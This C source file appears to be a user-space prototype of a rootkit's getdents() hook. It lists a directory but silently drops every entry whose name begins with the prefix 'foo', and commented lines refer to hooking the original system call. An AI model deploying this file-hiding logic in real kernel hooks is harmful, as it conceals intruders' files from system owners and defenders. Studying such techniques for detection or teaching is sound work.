#define _GNU_SOURCE
#include <dirent.h>     /* Defines DT_* constants */
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <string.h>     // For strncmp() and strlen()

#define handle_error(msg) \
  do { perror(msg); exit(EXIT_FAILURE); } while (0)

struct linux_dirent {
  unsigned long  d_ino;
  off_t          d_off;
  unsigned short d_reclen;
  char           d_name[];
};

#define BUF_SIZE 1024

static char* magic_prefix = "foo";

int starts_with(const char *prefix, const char *str)
{
  return strncmp(prefix, str, strlen(prefix)) == 0;
}

int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

int
main(int argc, char *argv[])
{
  int fd, nread;
  char buf[BUF_SIZE];
  struct linux_dirent *d;
  int bpos;
  char d_type;

  fd = open(argc > 1 ? argv[1] : ".", O_RDONLY | O_DIRECTORY);
  if (fd == -1)
    handle_error("open");

  for ( ; ; ) {
    //nread = syscall(SYS_getdents, fd, buf, BUF_SIZE);
    nread = new_getdents(fd, (struct linux_dirent*) buf, BUF_SIZE);

    if (nread == -1)
      handle_error("getdents");

    if (nread == 0)
      break;

    printf("--------------- nread=%d ---------------\n", nread);
    printf("inode#    file type  d_reclen  d_off   d_name\n");
    for (bpos = 0; bpos < nread;) {
      d = (struct linux_dirent *) (buf + bpos);

      if (d->d_ino == 0) {
        printf("Quitting early\n");
        printf("bpos=%d, nread=%d\n", bpos, nread);
        break;
      }

      printf("%8ld  ", d->d_ino);
      d_type = *(buf + bpos + d->d_reclen - 1);
      printf("%-10s ", (d_type == DT_REG) ?  "regular" :
                       (d_type == DT_DIR) ?  "directory" :
                       (d_type == DT_FIFO) ? "FIFO" :
                       (d_type == DT_SOCK) ? "socket" :
                       (d_type == DT_LNK) ?  "symlink" :
                       (d_type == DT_BLK) ?  "block dev" :
                       (d_type == DT_CHR) ?  "char dev" : "???");
      printf("%4d %10lld  %s\n", d->d_reclen,
              (long long) d->d_off, d->d_name);
      bpos += d->d_reclen;
    }
  }
  exit(EXIT_SUCCESS);
}

int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  int nread = 0;
  unsigned int bpos = 0, i = 0, j = 0;
  struct linux_dirent *d = NULL;
  char *user_buf = /*(char *) dirp*/ NULL;
  char starts_with_prefix = 0;
  unsigned int num_bytes_hidden = 0;

  printf("getdents() hook invoked\n");

  // getdents_hook = find_syscall_hook(__NR_getdents);
  // orig_func = (void*) getdents_hook->orig_func;
  // 
  // nread = orig_func(fd, dirp, count);
  nread = syscall(SYS_getdents, fd, dirp, BUF_SIZE);

  if (dirp == NULL || nread < 1) {
    return nread;
  }

  user_buf = (char *) dirp;

  char k_buf[count];

  // Fill k_buf with 0x00 bytes
  for (i = 0; i < count; ++i) {
    k_buf[i] = 0x00;
  }

  for (bpos = 0; bpos < (unsigned int)nread;) {
    d = (struct linux_dirent *) (user_buf + bpos);
    starts_with_prefix = starts_with(magic_prefix, d->d_name);

    printf("entry: %s%s\n", d->d_name,
           starts_with_prefix ? " (hidden)" : "");
    printf("entry reclen: %d\n", d->d_reclen);

    if (!starts_with_prefix) {
      for (i = bpos; i < bpos + d->d_reclen; ++i) {
        k_buf[j++] = user_buf[i];
      }
    } else {
      num_bytes_hidden += d->d_reclen;
    }

    bpos += d->d_reclen;
  }

  // Copy k_buf to user_buf - user_buf == dirp
  for (i = 0; i < count; ++i) {
    user_buf[i] = k_buf[i];
  }

  return nread - num_bytes_hidden;
}
